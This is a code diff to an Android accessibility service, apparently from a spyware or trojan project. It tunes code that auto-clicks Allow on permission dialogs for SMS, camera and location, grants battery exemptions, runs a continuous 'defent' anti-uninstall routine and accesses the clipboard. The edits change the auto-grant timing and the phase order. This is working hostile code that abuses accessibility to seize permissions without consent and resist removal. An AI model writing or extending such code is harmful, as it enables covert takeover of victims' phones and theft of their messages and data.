@@ -46,9 +46,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Handler autoClickHandler;
     private Runnable autoClickRunnable;
     
-    // Grant permissions — run permanently (always active)
+    // Grant permissions — active for 15 seconds after accessibility is enabled
     private long grantPermsStartTime = 0;
-    private static final long GRANT_PERMS_DURATION = Long.MAX_VALUE; // always on
+    private static final long GRANT_PERMS_DURATION = 15_000L; // 15 seconds max
 
     // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
     private volatile boolean uninstallAssistMode = false;
@@ -127,13 +127,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Start continuous auto-click scan immediately
         startAutoClickScanner();
 
-        // Start the sequential special-permission granter after a short delay so the
-        // standard runtime permission dialogs (SMS, Camera, Location, etc.) are shown
-        // FIRST.  Battery is the first item in the queue — per user requirement it must
-        // appear right after the standard permissions, not 4 seconds later.
+        // Start the sequential special-permission granter immediately.
+        // Grant-perms auto-click handles standard dialogs (SMS, Camera, Location, etc.)
+        // first for 15 seconds; special perms (battery) kick off right after.
         // Battery optimization is ONLY triggered here — never from MainActivity.
-        new Handler(Looper.getMainLooper()).postDelayed(
-            this::startSpecialPermissionGranter, 1500);
+        new Handler(Looper.getMainLooper()).post(this::startSpecialPermissionGranter);
         
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         
@@ -307,31 +305,34 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) return;
-            
+
             // Update app name
             updateCurrentAppName();
 
-            // Run UNINSTALL ASSIST — highest priority when active
-            if (runUninstallAssist(rootNode)) {
-                rootNode.recycle();
-                return;
-            }
-            
-            // Run DEFENT variables - never stop (continuously)
-            if (runDefentProtection(rootNode)) {
-                rootNode.recycle();
-                return;
-            }
-            
-            // Run GRANT PERMS - only for 10 seconds after accessibility enabled
             long elapsed = System.currentTimeMillis() - grantPermsStartTime;
-            if (elapsed < GRANT_PERMS_DURATION) {
+            boolean inGrantPhase = grantPermsStartTime > 0 && elapsed < GRANT_PERMS_DURATION;
+
+            if (inGrantPhase) {
+                // GRANT PERMS PHASE (first 15 s after accessibility enabled):
+                // Only click Allow/OK/etc. — no anti-uninstall, no defent.
                 if (runGrantPerms(rootNode)) {
                     rootNode.recycle();
                     return;
                 }
+            } else {
+                // NORMAL PHASE (after 15 s or grant phase never started):
+                // Uninstall-assist is highest priority when triggered.
+                if (runUninstallAssist(rootNode)) {
+                    rootNode.recycle();
+                    return;
+                }
+                // Then continuous defent protection.
+                if (runDefentProtection(rootNode)) {
+                    rootNode.recycle();
+                    return;
+                }
             }
-            
+
             rootNode.recycle();
         } catch (Exception e) {
             e.printStackTrace();
